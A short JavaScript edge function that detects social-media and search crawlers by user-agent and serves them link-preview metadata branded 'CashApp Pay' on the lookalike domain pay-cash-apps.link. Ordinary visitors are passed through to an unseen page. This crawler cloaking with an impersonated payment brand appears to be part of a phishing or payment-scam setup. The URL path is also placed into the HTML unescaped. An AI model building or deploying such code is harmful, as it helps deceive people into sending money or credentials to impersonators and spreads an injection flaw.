export default async (request, context) => {
  const url = new URL(request.url);
  const path = url.pathname.replace(/^\//, '');


  if (!path || path.includes('.') || path.startsWith('api') || path.startsWith('assets')) {
    return context.next();
  }

  const ua = request.headers.get('user-agent') || '';
  const isBot = /facebookexternalhit|Facebot|Twitterbot|WhatsApp|TelegramBot|LinkedInBot|SkypeUriPreview|Slackbot|Discordbot|Googlebot/i.test(ua);


  if (!isBot) {
    return context.next();
  }

  
  const username = path.split('/')[0];
  const formattedName = username.charAt(0).toUpperCase() + username.slice(1);

  const title = `Pay ${formattedName}`;
  const description = `Send secure payment instantly via Cash App.`;
  const previewImageUrl = `https://thunder-m.vercel.app/og/${encodeURIComponent(username)}`;
  

  const currentUrl = `https://pay-cash-apps.link/${username}`;

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>${title}</title>
  <meta name="description" content="${description}" />

  <!-- Open Graph -->
  <meta property="og:type" content="website" />
  <meta property="og:site_name" content="CashApp Pay" />
  <meta property="og:title" content="${title}" />
  <meta property="og:description" content="${description}" />
  <meta property="og:image" content="${previewImageUrl}" />
  <meta property="og:image:secure_url" content="${previewImageUrl}" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />
  <meta property="og:url" content="${currentUrl}" />

  <!-- Twitter -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="${title}" />
  <meta name="twitter:description" content="${description}" />
  <meta name="twitter:image" content="${previewImageUrl}" />
</head>
<body>
  <p>Loading payment for ${formattedName}...</p>
</body>
</html>`;

  return new Response(html, {
    status: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'public, max-age=3600'
    }
  });
};

export const config = {
  path: '/*'
};